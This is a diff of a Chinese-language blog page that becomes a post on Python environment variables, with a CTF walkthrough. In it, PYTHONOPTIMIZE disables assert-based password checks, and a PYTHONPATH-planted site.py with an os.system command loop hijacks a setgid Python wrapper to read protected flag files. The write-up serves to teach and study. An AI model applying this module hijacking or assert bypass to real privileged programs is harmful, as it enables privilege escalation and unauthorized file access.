@@ -6,15 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: CTF | Abyss&#39;s Blog</title>
+  <title>Python环境变量 | Abyss&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Abyss&#39;s Blog">
-<meta property="og:url" content="http://yoursite.com/tags/CTF/index.html">
+  <meta name="description" content="1 查看通过命令python --help可以查看到与Python相关的环境变量，下面是python3.6.5的部分结果 123456789101112131415161718192021222324252627282930313233root@kali:~# python3 --helpusage: python3 [option] ... [-c cmd | -m mod | file | -">
+<meta name="keywords" content="Python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python环境变量">
+<meta property="og:url" content="http://yoursite.com/2019/10/02/python-env-20191002/index.html">
 <meta property="og:site_name" content="Abyss&#39;s Blog">
+<meta property="og:description" content="1 查看通过命令python --help可以查看到与Python相关的环境变量，下面是python3.6.5的部分结果 123456789101112131415161718192021222324252627282930313233root@kali:~# python3 --helpusage: python3 [option] ... [-c cmd | -m mod | file | -">
 <meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-10-02T06:42:56.391Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Abyss&#39;s Blog">
+<meta name="twitter:title" content="Python环境变量">
+<meta name="twitter:description" content="1 查看通过命令python --help可以查看到与Python相关的环境变量，下面是python3.6.5的部分结果 123456789101112131415161718192021222324252627282930313233root@kali:~# python3 --helpusage: python3 [option] ... [-c cmd | -m mod | file | -">
   
     <link rel="alternative" href="/atom.xml" title="Abyss&#39;s Blog" type="application/atom+xml">
   
@@ -148,114 +153,189 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-python-env-20191002" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/24/mysql-read-write-file-20190924/" class="archive-article-date">
-  	<time datetime="2019-09-24T03:13:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-24</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/24/mysql-read-write-file-20190924/">Mysql读取/写入文件</a>
+    <h1 class="article-title" itemprop="name">
+      Python环境变量
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2019/10/02/python-env-20191002/" class="archive-article-date">
+  	<time datetime="2019-10-02T06:37:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="1-查看"><a href="#1-查看" class="headerlink" title="1 查看"></a>1 查看</h1><p>通过命令<code>python --help</code>可以查看到与Python相关的环境变量，下面是python3.6.5的部分结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python3 --help</span></span><br><span class="line">usage: python3 [option] ... [-c cmd | -m mod | file | -] [arg] ...</span><br><span class="line">Options and arguments (and corresponding environment variables):</span><br><span class="line">-B     : don<span class="string">'t write .pyc files on import; also PYTHONDONTWRITEBYTECODE=x</span></span><br><span class="line"><span class="string">-c cmd : program passed in as string (terminates option list)</span></span><br><span class="line"><span class="string">-d     : debug output from parser; also PYTHONDEBUG=x</span></span><br><span class="line"><span class="string">-E     : ignore PYTHON* environment variables (such as PYTHONPATH)</span></span><br><span class="line"><span class="string">-i     : inspect interactively after running script; forces a prompt even</span></span><br><span class="line"><span class="string">         if stdin does not appear to be a terminal; also PYTHONINSPECT=x</span></span><br><span class="line"><span class="string">-O     : remove assert and __debug__-dependent statements; add .opt-1 before</span></span><br><span class="line"><span class="string">         .pyc extension; also PYTHONOPTIMIZE=x</span></span><br><span class="line"><span class="string">-s     : don'</span>t add user site directory to sys.path; also PYTHONNOUSERSITE</span><br><span class="line">-S     : don<span class="string">'t imply '</span>import site<span class="string">' on initialization</span></span><br><span class="line"><span class="string">-u     : force the binary I/O layers of stdout and stderr to be unbuffered;</span></span><br><span class="line"><span class="string">         stdin is always buffered; text I/O layer will be line-buffered;</span></span><br><span class="line"><span class="string">         also PYTHONUNBUFFERED=x</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Other environment variables:</span></span><br><span class="line"><span class="string">PYTHONSTARTUP: file executed on interactive startup (no default)</span></span><br><span class="line"><span class="string">PYTHONPATH   : '</span>:<span class="string">'-separated list of directories prefixed to the</span></span><br><span class="line"><span class="string">               default module search path.  The result is sys.path.</span></span><br><span class="line"><span class="string">PYTHONHOME   : alternate &lt;prefix&gt; directory (or &lt;prefix&gt;:&lt;exec_prefix&gt;).</span></span><br><span class="line"><span class="string">               The default module search path uses &lt;prefix&gt;/lib/pythonX.X.</span></span><br><span class="line"><span class="string">PYTHONCASEOK : ignore case in '</span>import<span class="string">' statements (Windows).</span></span><br><span class="line"><span class="string">PYTHONIOENCODING: Encoding[:errors] used for stdin/stdout/stderr.</span></span><br><span class="line"><span class="string">PYTHONFAULTHANDLER: dump the Python traceback on fatal errors.</span></span><br><span class="line"><span class="string">PYTHONHASHSEED: if this variable is set to '</span>random<span class="string">', a random value is used</span></span><br><span class="line"><span class="string">   to seed the hashes of str, bytes and datetime objects.  It can also be</span></span><br><span class="line"><span class="string">   set to an integer in the range [0,4294967295] to get hash values with a</span></span><br><span class="line"><span class="string">   predictable seed.</span></span><br><span class="line"><span class="string">PYTHONMALLOC: set the Python memory allocators and/or install debug hooks</span></span><br><span class="line"><span class="string">   on Python memory allocators. Use PYTHONMALLOC=debug to install debug</span></span><br><span class="line"><span class="string">   hooks.</span></span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+<h1 id="2-PYTHONOPTIMIZE"><a href="#2-PYTHONOPTIMIZE" class="headerlink" title="2 PYTHONOPTIMIZE"></a>2 PYTHONOPTIMIZE</h1><p>同参数-O效果一样，可以关闭assert的检查</p>
+<h1 id="2-1-例题"><a href="#2-1-例题" class="headerlink" title="2.1 例题"></a>2.1 例题</h1><p>一道CTF题目如下<br>文件列表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">guest@13c26d73dbd0:/challenge$ ls -l</span><br><span class="line">total 24</span><br><span class="line">-rw-r----- 1 root challenge   48 Mar 26  2019 flag</span><br><span class="line">-rwxr-xr-x 1 root root       766 Mar 26  2019 pychecker.py</span><br><span class="line">-rwxr-sr-x 1 root challenge 8672 Mar 26  2019 run_pychecker</span><br><span class="line">drwxr-x--- 1 root challenge 4096 Mar 26  2019 second_flag</span><br><span class="line">guest@13c26d73dbd0:/challenge$</span><br></pre></td></tr></table></figure>
+
+<p>python文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(filename, encoding=<span class="string">'utf-8'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'r'</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha1</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, str):</span><br><span class="line">        s = s.encode()</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(s).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha256</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, str):</span><br><span class="line">        s = s.encode()</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(s).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FLAG = read(<span class="string">'flag'</span>)</span><br><span class="line">sys.tracebacklimit = <span class="number">0</span></span><br><span class="line">print(<span class="string">'Welcome to PyChecker'</span>)</span><br><span class="line">password = input(<span class="string">'Input your super secret key: '</span>)</span><br><span class="line"><span class="keyword">assert</span> sha1(password) == <span class="string">'e17f363d5f29291adc8f698b4cfab99573d62ce9'</span>, <span class="string">'Invalid credentials.'</span></span><br><span class="line"><span class="keyword">assert</span> sha256(password) == <span class="string">'7470668f5fa052041c254ab11c539883296d2a2520fe36c61ff7ec1a066e4a65'</span>, <span class="string">'Invalid credentials.'</span></span><br><span class="line">print(<span class="string">'Congratulations! Your flag is: %s'</span> % FLAG)</span><br></pre></td></tr></table></figure>
+
+<p>这里就可以通过设置环境变量PYTHONOPTIMIZE来关闭assert的检查，获得flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">guest@13c26d73dbd0:/challenge$ <span class="built_in">export</span> PYTHONOPTIMIZE=True</span><br><span class="line">guest@13c26d73dbd0:/challenge$ ./run_pychecker</span><br><span class="line">Welcome to PyChecker</span><br><span class="line">Input your super secret key: 1</span><br><span class="line">Congratulations! Your flag is: 0ops&#123;ass3rt_15_n0t_s3cur17y_ch3ck_4ed1c8fd44ae&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-PYTHONPATH"><a href="#3-PYTHONPATH" class="headerlink" title="3 PYTHONPATH"></a>3 PYTHONPATH</h1><p>用于指定Python搜索模块的路径，默认的搜索路径可以通过<code>os.sys.path</code>获得，<code>PYTHONPATH</code>环境变量设置的路径会添加到<code>os.sys.path</code>中，并且是排在前面的,多个目录是通过 <strong>:</strong> 分隔。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python3</span></span><br><span class="line">Python 3.6.5rc1 (default, Mar 14 2018, 06:54:23)</span><br><span class="line">[GCC 7.3.0] on linux</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(os.sys.path)</span><br><span class="line">[<span class="string">''</span>, <span class="string">'/usr/lib/python36.zip'</span>, <span class="string">'/usr/lib/python3.6'</span>, <span class="string">'/usr/lib/python3.6/lib-dynload'</span>, <span class="string">'/usr/local/lib/python3.6/dist-packages'</span>, <span class="string">'/usr/lib/python3/dist-packages'</span>]</span><br><span class="line">root@kali:~/src/python<span class="comment"># export PYTHONPATH=/etc:/root</span></span><br><span class="line">root@kali:~/src/python<span class="comment"># python3</span></span><br><span class="line">Python 3.6.5rc1 (default, Mar 14 2018, 06:54:23)</span><br><span class="line">[GCC 7.3.0] on linux</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(os.sys.path)</span><br><span class="line">[<span class="string">''</span>, <span class="string">'/etc'</span>, <span class="string">'/root'</span>, <span class="string">'/usr/lib/python36.zip'</span>, <span class="string">'/usr/lib/python3.6'</span>, <span class="string">'/usr/lib/python3.6/lib-dynload'</span>, <span class="string">'/usr/local/lib/python3.6/dist-packages'</span>, <span class="string">'/usr/lib/python3/dist-packages'</span>]</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-1-默认导入的模块"><a href="#3-1-默认导入的模块" class="headerlink" title="3.1 默认导入的模块"></a>3.1 默认导入的模块</h2><p>首先可以看到python的帮助信息中的-S说明，可以关闭默认导入的site模块，默认会导入site.py（PS:如果需要使用site模块，还是需要明确import site才行）<br>这里有一个思路是查看会默认导入的模块<br>首先是查看<code>os.sys.path</code>的路径，这里以<code>python/Lib</code>目录为例，导入的文件会生成<code>.pyc</code>文件。<br><strong>python2</strong>：python文件的当前目录下生成.pyc文件，因此把存在的.pyc文件都删除，执行一次python，看会生成哪些.pyc文件<br><strong>python3</strong>：同理，不过生成的.pyc文件会统一在<code>__pycache__</code>目录下，因此删除目录即可。</p>
+<h2 id="3-2例题"><a href="#3-2例题" class="headerlink" title="3.2例题"></a>3.2例题</h2><p>2.1的例题中存在second_flag，因此通过设置<code>PYTHONPATH</code>变量，自定义一个新的同名模块文件，这样就可以执行自定义python代码了。<br>准备一个site.py（测试下来，site.py对python文件影响小，换成os.py会有报错，换成abc.py直接失败了，可以自行尝试）存入/tmp/exp目录下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd=input(<span class="string">"&gt;"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"exit"</span> <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.system(cmd)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">guest@13c26d73dbd0:/challenge$ <span class="built_in">export</span> PYTHONPATH=/tmp/exp</span><br><span class="line">guest@13c26d73dbd0:/challenge$ ./run_pychecker</span><br><span class="line">&gt;ls</span><br><span class="line">flag  pychecker.py  run_pychecker  second_flag</span><br><span class="line">&gt;ls ./second_flag</span><br><span class="line">18d4f73997a89a7bb58a282040ada086</span><br><span class="line">&gt;cat ./second_flag/18d4f73997a89a7bb58a282040ada086</span><br><span class="line">0ops&#123;su1d_pyth0n_15_d4ng3r0u5_f0f036014ebb&#125;</span><br><span class="line">&gt;<span class="built_in">exit</span></span><br><span class="line">Welcome to PyChecker</span><br><span class="line">Input your super secret key:</span><br><span class="line">Congratulations! Your flag is: 0ops&#123;ass3rt_15_n0t_s3cur17y_ch3ck_4ed1c8fd44ae&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">SQLi</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/10/02/python-env-20191002/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/sqli-join-20190910/" class="archive-article-date">
-  	<time datetime="2019-09-10T05:25:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/09/24/mysql-read-write-file-20190924/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Mysql读取/写入文件</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/10/sqli-join-20190910/">JOIN绕过逗号以及列名过滤</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">SQLi</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
+
+  
 
 
           </div>
@@ -278,9 +358,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
